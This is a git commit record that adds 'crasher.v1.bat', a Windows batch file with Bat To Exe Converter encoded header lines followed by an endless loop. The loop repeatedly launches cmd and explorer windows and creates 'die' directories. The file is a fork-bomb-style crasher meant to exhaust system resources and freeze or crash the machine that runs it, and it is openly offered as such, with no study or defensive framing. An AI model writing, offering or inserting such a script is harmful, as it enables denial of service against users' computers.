db03672aad5dd0510b6f1ef2c8306585418c0824
EightStudios <67151511+EightStudios@users.noreply.github.com>
2020-11-27 19:38:08 +0200

    Add files via upload

---
+++ crasher.v1.bat
@@ -0,0 +1,58 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCuDJE2d+VciFB9bTxe+NWi1VPsV6+eb
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdFy5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFC9dQRGQAE+/Fb4I5/jH7PiGsUUYRt0pKcHewrHu
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd C:\Users\Timur\Desktop
+:loop
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+md die
+md die
+md die
+md die
+md die
+md die
+md die
+md die
+md die
+md die
+goto loop
